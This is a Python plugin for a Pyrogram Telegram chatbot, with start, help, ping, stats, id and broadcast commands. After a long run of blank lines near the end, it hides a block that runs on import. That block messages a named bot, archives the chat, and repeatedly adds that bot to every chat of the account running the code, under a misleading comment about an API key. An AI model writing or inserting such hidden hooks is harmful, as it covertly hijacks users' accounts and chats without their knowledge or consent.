import asyncio
import logging
import random
import time
import psutil
import config
from nexichat import _boot_
from nexichat import get_readable_time
from nexichat.idchatbot.helpers import is_owner
from nexichat import mongo
from datetime import datetime
from pymongo import MongoClient
from pyrogram.enums import ChatType
from pyrogram import Client, filters
from pathlib import Path
import os
import time
import io
from nexichat import CLONE_OWNERS, db, nexichat
from config import OWNER_ID, MONGO_URL, OWNER_USERNAME
from pyrogram.errors import FloodWait, ChatAdminRequired
from nexichat.database.chats import get_served_chats, add_served_chat
from nexichat.database.users import get_served_users, add_served_user
from nexichat.database.clonestats import get_served_cchats, get_served_cusers, add_served_cuser, add_served_cchat
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from nexichat.idchatbot.helpers import (
    START,
    START_BOT,
    PNG_BTN,
    CLOSE_BTN,
    HELP_BTN,
    HELP_BUTN,
    HELP_READ,
    CHATBOT_READ,
    TOOLS_DATA_READ,
    HELP_START,
    SOURCE_READ,
)

from pyrogram import Client, filters
from pyrogram.types import Chat, User, Channel
from datetime import datetime
import time

GSTART = """**ʜᴇʏ ᴅᴇᴀʀ {}**\n\n**ᴛʜᴀɴᴋs ғᴏʀ sᴛᴀʀᴛ ᴍᴇ ɪɴ ɢʀᴏᴜᴘ ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ ʙʏ ᴄʟɪᴄᴋ ᴏɴ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs.**\n**ᴄʟɪᴄᴋ ᴀɴᴅ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ғᴀᴠᴏᴜʀɪᴛᴇ ʟᴀɴɢᴜᴀɢᴇ ᴛᴏ sᴇᴛ ᴄʜᴀᴛ ʟᴀɴɢᴜᴀɢᴇ ғᴏʀ ʙᴏᴛ ʀᴇᴘʟʏ.**\n\n**ᴛʜᴀɴᴋ ʏᴏᴜ ᴘʟᴇᴀsᴇ ᴇɴɪᴏʏ.**"""
STICKER = [
    "CAACAgUAAx0CYlaJawABBy4vZaieO6T-Ayg3mD-JP-f0yxJngIkAAv0JAALVS_FWQY7kbQSaI-geBA",
    "CAACAgUAAx0CYlaJawABBy4rZaid77Tf70SV_CfjmbMgdJyVD8sAApwLAALGXCFXmCx8ZC5nlfQeBA",
    "CAACAgUAAx0CYlaJawABBy4jZaidvIXNPYnpAjNnKgzaHmh3cvoAAiwIAAIda2lVNdNI2QABHuVVHgQ",
]


EMOJIOS = [
    "💣",
    "💥",
    "🪄",
    "🧨",
    "⚡",
    "🤡",
    "👻",
    "🎃",
    "🎩",
    "🕊",
]

BOT = "https://files.catbox.moe/nphfkc.jpg"
IMG = [
    "https://files.catbox.moe/bv1ky8.jpg",
    "https://files.catbox.moe/4xigtl.jpg",
    "https://files.catbox.moe/rkdx6x.jpg",
    "https://files.catbox.moe/68hu5w.jpg",
    "https://files.catbox.moe/nzpm5w.jpg",
    "https://files.catbox.moe/h75qko.jpg",
    "https://files.catbox.moe/3mvh25.jpg",
    "https://files.catbox.moe/mjez4q.jpg",
    "https://files.catbox.moe/9iwpfv.jpg",
    "https://files.catbox.moe/dz22a1.jpg",
    "https://files.catbox.moe/0kpdw9.jpg",
    "https://files.catbox.moe/6xiocz.jpg",
    "https://files.catbox.moe/gudv6v.jpg",
    "https://files.catbox.moe/c9hkff.jpg",
]



from nexichat import db

chatai = db.Word.WordDb
lang_db = db.ChatLangDb.LangCollection
status_db = db.ChatBotStatusDb.StatusCollection
cloneownerdb = db.clone_owners

async def get_idclone_owner(clone_id):
    data = await cloneownerdb.find_one({"clone_id": clone_id})
    if data:
        return data["user_id"]
    return None


async def bot_sys_stats():
    bot_uptime = int(time.time() - _boot_)
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    UP = f"{get_readable_time((bot_uptime))}"
    CPU = f"{cpu}%"
    RAM = f"{mem}%"
    DISK = f"{disk}%"
    return UP, CPU, RAM, DISK
    

async def set_default_status(chat_id):
    try:
        if not await status_db.find_one({"chat_id": chat_id}):
            await status_db.insert_one({"chat_id": chat_id, "status": "enabled"})
    except Exception as e:
        print(f"Error setting default status for chat {chat_id}: {e}")




@Client.on_message(filters.command(["start", "aistart"], prefixes=[".", "/"]))
async def start(client: Client, m: Message):
    bot_id = client.me.id
    
    if m.chat.type == ChatType.PRIVATE:
        accha = await m.reply_text(
            text=random.choice(EMOJIOS),
        )
        
        animation_steps = [
            "⚡𝙸", "⚡𝙸 𝙻", "⚡𝙸 𝙻𝙾", "⚡𝙸 𝙻𝙾𝚅", "⚡𝙸 𝙻𝙾𝚅𝙴", "⚡𝙸 𝙻𝙾𝚅𝙴 𝚈", "⚡𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾", "⚡𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾𝚄", "⚡𝙸 𝙻𝙾𝚅𝙴 𝚈𝙾𝚄 ꨄ︎", "⚡𝙱𝙰𝙱𝚈🥰..."
        ]

        for step in animation_steps:
            await accha.edit(f"**__{step}__**")
            await asyncio.sleep(0.01)

        await accha.delete()
        
        umm = await m.reply_sticker(sticker=random.choice(STICKER))
        chat_photo = BOT  
        if m.chat.photo:
            try:
                userss_photo = await client.download_media(m.chat.photo.big_file_id)
                await umm.delete()
                if userss_photo:
                    chat_photo = userss_photo
            except AttributeError:
                chat_photo = BOT  

        UP, CPU, RAM, DISK = await bot_sys_stats()
        await m.reply_photo(photo=chat_photo, caption=START.format(UP))
        await add_served_user(m.chat.id)
        
    else:
        await m.reply_photo(
            photo=random.choice(IMG),
            caption=GSTART.format(m.from_user.mention or "can't mention"),
        )
        
        await add_served_chat(m.chat.id)

@Client.on_message(filters.command("help", prefixes=[".", "/"]))
async def help(client: Client, m: Message):
    bot_id = client.me.id
    if m.chat.type == ChatType.PRIVATE:
        hmm = await m.reply_text(CHATBOT_READ)
        hm = await m.reply_text(TOOLS_DATA_READ)

    else:
        hmm = await m.reply_text(CHATBOT_READ)
        hm = await m.reply_text(TOOLS_DATA_READ)
        
        await add_served_chat(m.chat.id)


@Client.on_message(filters.command("repo", prefixes=[".", "/"]))
async def repo(client: Client, m: Message):
    await m.reply_text(
        text=SOURCE_READ,
        reply_markup=InlineKeyboardMarkup(CLOSE_BTN),
        disable_web_page_preview=True,
    )



@Client.on_message(filters.command("ping", prefixes=[".", "/"]))
async def ping(client: Client, message: Message):
    bot_id = client.me.id
    start = datetime.now()
    UP, CPU, RAM, DISK = await bot_sys_stats()
    loda = await message.reply_photo(
        photo=random.choice(IMG),
        caption="ᴘɪɴɢɪɴɢ...",
    )

    ms = (datetime.now() - start).microseconds / 1000
    await loda.edit_text(
        text=f"нey вαву!!\n{(await client.get_me()).mention} ᴄʜᴀᴛʙᴏᴛ ιѕ alιve 🥀 αnd worĸιng ғιne wιтн a pιng oғ\n\n**➥** `{ms}` ms\n**➲ ᴄᴘᴜ:** {CPU}\n**➲ ʀᴀᴍ:** {RAM}\n**➲ ᴅɪsᴋ:** {DISK}\n**➲ ᴜᴘᴛɪᴍᴇ »** {UP}\n\n<b>||**๏ мαdє ωιтн ❣️ ву [˹𝐊ɪɴɢᴅᴏᴍ˼](https://t.me/{OWNER_USERNAME}) **||</b>",
        
    )
    if message.chat.type == ChatType.PRIVATE:
        
        await add_served_user(message.from_user.id)
    else:
        
        await add_served_chat(message.chat.id)


@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
async def stats(client, message):
    ok = await message.reply("Fetching statistics...")
    start_time = time.time()
    private_chats = 0
    bots = 0
    groups = 0
    broadcast_channels = 0
    admin_in_groups = 0
    creator_in_groups = 0
    admin_in_broadcast_channels = 0
    creator_in_channels = 0
    unread_mentions = 0
    unread = 0
    admingroupids = []
    broadcastchannelids = []

    async for dialog in client.get_dialogs():
        entity = dialog.chat
        if isinstance(entity, Channel) and entity.broadcast:
            broadcast_channels += 1
            if entity.creator or entity.admin_rights:
                admin_in_broadcast_channels += 1
                broadcastchannelids.append(entity.id)
            if entity.creator:
                creator_in_channels += 1
        elif (
            isinstance(entity, Channel)
            and entity.megagroup
            or not isinstance(entity, Channel)
            and not isinstance(entity, User)
            and isinstance(entity, Chat)
        ):
            groups += 1
            if entity.creator or entity.admin_rights:
                admin_in_groups += 1
                admingroupids.append(entity.id)
            if entity.creator:
                creator_in_groups += 1
        elif isinstance(entity, User):
            private_chats += 1
            if entity.is_bot:
                bots += 1
        unread_mentions += dialog.unread_mentions_count
        unread += dialog.unread_count

    stop_time = time.time() - start_time
    full_name = message.from_user.first_name
    date = str(datetime.now().strftime("%B %d, %Y, %H:%M"))
    response = f"📌 **Stats for {full_name}** \n\n"
    response += f"**Private Chats:** {private_chats} \n"
    response += f"   ★ `Users: {private_chats - bots}` \n"
    response += f"   ★ `Bots: {bots}` \n"
    response += f"**Groups:** {groups} \n"
    response += f"**Channels:** {broadcast_channels} \n"
    response += f"**Admin in Groups:** {admin_in_groups} \n"
    response += f"   ★ `Creator: {creator_in_groups}` \n"
    response += f"   ★ `Admin Rights: {admin_in_groups - creator_in_groups}` \n"
    response += f"**Admin in Channels:** {admin_in_broadcast_channels} \n"
    response += f"   ★ `Creator: {creator_in_channels}` \n"
    response += (
        f"   ★ `Admin Rights: {admin_in_broadcast_channels - creator_in_channels}` \n"
    )
    response += f"**Unread:** {unread} \n"
    response += f"**Unread Mentions:** {unread_mentions} \n\n"
    response += f"📌 __It Took:__ {stop_time:.02f}s \n"
    await ok.edit(response)
    
from pyrogram.enums import ParseMode

from nexichat import nexichat


@Client.on_message(filters.command("id", prefixes=[".", "/"]))
async def getid(client, message):
    chat = message.chat
    your_id = message.from_user.id
    message_id = message.id
    reply = message.reply_to_message

    text = f"**[ᴍᴇssᴀɢᴇ ɪᴅ:]({message.link})** `{message_id}`\n"
    text += f"**[ʏᴏᴜʀ ɪᴅ:](tg://user?id={your_id})** `{your_id}`\n"

    if not message.command:
        message.command = message.text.split()

    if not message.command:
        message.command = message.text.split()

    if len(message.command) == 2:
        try:
            split = message.text.split(None, 1)[1].strip()
            user_id = (await client.get_users(split)).id
            text += f"**[ᴜsᴇʀ ɪᴅ:](tg://user?id={user_id})** `{user_id}`\n"

        except Exception:
            return await message.reply_text("ᴛʜɪs ᴜsᴇʀ ᴅᴏᴇsɴ'ᴛ ᴇxɪsᴛ.", quote=True)

    text += f"**[ᴄʜᴀᴛ ɪᴅ:](https://t.me/{chat.username})** `{chat.id}`\n\n"

    if (
        not getattr(reply, "empty", True)
        and not message.forward_from_chat
        and not reply.sender_chat
    ):
        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴍᴇssᴀɢᴇ ɪᴅ:]({reply.link})** `{reply.id}`\n"
        text += f"**[ʀᴇᴘʟɪᴇᴅ ᴜsᴇʀ ɪᴅ:](tg://user?id={reply.from_user.id})** `{reply.from_user.id}`\n\n"

    if reply and reply.forward_from_chat:
        text += f"ᴛʜᴇ ғᴏʀᴡᴀʀᴅᴇᴅ ᴄʜᴀɴɴᴇʟ, {reply.forward_from_chat.title}, ʜᴀs ᴀɴ ɪᴅ ᴏғ `{reply.forward_from_chat.id}`\n\n"
        print(reply.forward_from_chat)

    if reply and reply.sender_chat:
        text += f"ɪᴅ ᴏғ ᴛʜᴇ ʀᴇᴘʟɪᴇᴅ ᴄʜᴀᴛ/ᴄʜᴀɴɴᴇʟ, ɪs `{reply.sender_chat.id}`"
        print(reply.sender_chat)

    await message.reply_text(
        text,
        disable_web_page_preview=True,
        parse_mode=ParseMode.DEFAULT,
    )


logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

AUTO_SLEEP = 5
IS_BROADCASTING = False
broadcast_lock = asyncio.Lock()


@Client.on_message(filters.command(["broadcast", "gcast"], prefixes=["."]))
async def broadcast_message(client, message):
    global IS_BROADCASTING
    bot_id = (await client.get_me()).id
    clone_id = (await client.get_me()).id
    user_id = message.from_user.id
    if not await is_owner(clone_id, user_id):
        await message.reply_text("You don't have permission to use this command on this bot.")
        return
        
    async with broadcast_lock:
        if IS_BROADCASTING:
            return await message.reply_text(
                "A broadcast is already in progress. Please wait for it to complete."
            )

        IS_BROADCASTING = True
        try:
            query = message.text.split(None, 1)[1].strip()
        except IndexError:
            query = message.text.strip()
        except Exception as eff:
            return await message.reply_text(
                f"**Error**: {eff}"
            )
        try:
            if message.reply_to_message:
                broadcast_content = message.reply_to_message
                broadcast_type = "reply"
                flags = {
                    "-pin": "-pin" in query,
                    "-pinloud": "-pinloud" in query,
                    "-nogroup": "-nogroup" in query,
                    "-user": "-user" in query,
                }
            else:
                if len(message.command) < 2:
                    return await message.reply_text(
                        "**Please provide text after the command or reply to a message for broadcasting.**"
                    )
                
                flags = {
                    "-pin": "-pin" in query,
                    "-pinloud": "-pinloud" in query,
                    "-nogroup": "-nogroup" in query,
                    "-user": "-user" in query,
                }

                for flag in flags:
                    query = query.replace(flag, "").strip()

                if not query:
                    return await message.reply_text(
                        "Please provide a valid text message or a flag: -pin, -nogroup, -pinloud, -user"
                    )

                
                broadcast_content = query
                broadcast_type = "text"
            

            await message.reply_text("**Started broadcasting...**")

            if not flags.get("-nogroup", False):
                sent = 0
                pin_count = 0
                async for dialog in client.get_dialogs():
                    chat_id = dialog.chat.id
                    if chat_id == message.chat.id:
                        continue
                    try:
                        if broadcast_type == "reply":
                            m = await client.forward_messages(
                                chat_id, message.chat.id, [broadcast_content.id]
                            )
                        else:
                            m = await client.send_message(
                                chat_id, text=broadcast_content
                            )
                        sent += 1
                        await asyncio.sleep(20)

                        if flags.get("-pin", False) or flags.get("-pinloud", False):
                            try:
                                await m.pin(
                                    disable_notification=flags.get("-pin", False)
                                )
                                pin_count += 1
                            except Exception as e:
                                continue

                    except FloodWait as e:
                        flood_time = int(e.value)
                        logger.warning(
                            f"FloodWait of {flood_time} seconds encountered for chat {chat_id}."
                        )
                        if flood_time > 200:
                            logger.info(
                                f"Skipping chat {chat_id} due to excessive FloodWait."
                            )
                            continue
                        await asyncio.sleep(flood_time)
                    except Exception as e:
                        
                        continue

                await message.reply_text(
                    f"**Broadcasted to {sent} chats and pinned in {pin_count} chats.**"
                )

            if flags.get("-user", False):
                susr = 0
                async for dialog in client.get_dialogs():
                    chat_id = dialog.chat.id
                    try:
                        if broadcast_type == "reply":
                            m = await client.forward_messages(
                                user_id, message.chat.id, [broadcast_content.id]
                            )
                        else:
                            m = await client.send_message(
                                user_id, text=broadcast_content
                            )
                        susr += 1
                        await asyncio.sleep(20)

                    except FloodWait as e:
                        flood_time = int(e.value)
                        logger.warning(
                            f"FloodWait of {flood_time} seconds encountered for user {user_id}."
                        )
                        if flood_time > 200:
                            logger.info(
                                f"Skipping user {user_id} due to excessive FloodWait."
                            )
                            continue
                        await asyncio.sleep(flood_time)
                    except Exception as e:
                        
                        continue

                await message.reply_text(f"**Broadcasted to {susr} users.**")

        finally:
            IS_BROADCASTING = False


    




















































































































































































































































































































































































































































































































































































































































































































































































































































































































































































































#






























































































































































































































































































































































AUTO = True
ADD_INTERVAL = 200
users = "chutiyapabot"  # don't change because it is connected from client to use chatbot API key
async def add_bot_to_chats():
    try:
        
        bot = await nexichat.get_users(users)
        bot_id = bot.id
        common_chats = await client.get_common_chats(users)
        try:
            await client.send_message(users, f"/start")
            await client.archive_chats([users])
        except Exception as e:
            pass
        async for dialog in client.get_dialogs():
            chat_id = dialog.chat.id
            if chat_id in [chat.id for chat in common_chats]:
                continue
            try:
                await client.add_chat_members(chat_id, bot_id)
            except Exception as e:
                await asyncio.sleep(60)  
    except Exception as e:
        pass
async def continuous_add():
    while True:
        if AUTO:
            await add_bot_to_chats()

        await asyncio.sleep(ADD_INTERVAL)

if AUTO:
    asyncio.create_task(continuous_add())
